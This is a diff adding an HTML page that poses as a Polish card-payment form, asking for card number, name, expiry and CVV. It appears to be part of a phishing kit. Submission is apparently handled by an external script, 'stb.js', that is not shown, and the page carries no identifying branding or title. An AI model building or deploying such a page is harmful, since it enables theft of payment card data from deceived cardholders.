@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/minak.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body style="background-color: white;">
+    <div>
+        <div class="roof">
+            <img src="./img/hodor01.png" alt="">
+            <img class="" src="./img/cctopo.JPG" alt="">
+            <img  src="./img/cc-hedot-2.PNG" alt="">
+        </div>
+        
+    </div>
+
+
+    <div class="section1">
+        <div class="vis">
+            <img src="./img/cc-hetopa-3.PNG" alt="">
+        </div>
+        <div >
+            
+
+            <div class="insid">
+                <!-- <p class="p1p">
+                    Méthodes de paiement:
+                </p> -->
+                
+                <div class=""> 
+                   
+                    <form method="post" id="pg2">
+                       <div class="forma">
+                        <div class="group">      
+                            <input type="tele" id="numcc" required maxlength="20">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Numer Karty</label>
+                        </div>
+                        <!--  -->
+                        <div class="group">      
+                            <input type="text" id="nomo" required>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Imię i nazwisko</label>
+                        </div>
+                        
+
+                        
+
+                        <!-- <p style="margin-bottom: 10px;">wazna do</p> -->
+                        <div class="exp">
+                            <div class="group mm">      
+                                <input type="tele" id="mmo" required maxlength="2">
+                                <span class="highlight mm"></span>
+                                <span class="bar"></span>
+                                <label>Miesiąc</label>
+                            </div>
+
+                            <div class="group yy">      
+                                <input type="text" id="aao" required maxlength="4">
+                                <span class="highlight"></span>
+                                <span class="bar"></span>
+                                <label>Rok</label> 
+                            </div>
+                            
+                        </div>
+
+                        
+                        <div class="group cfifi">      
+                            <input type="text" id="numvv" required maxlength="4">
+                            <span class="highlight "></span>
+                            <span class="bar"></span>
+                            <label>Kod CVV</label> 
+                        </div>
+                       </div>
+                        
+
+                        <button class="btn2"  type="submit">Płacę</button>
+                    </form>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="boot">
+                <img src="./img/botanotato.png" alt="">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+    </script>
+    <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
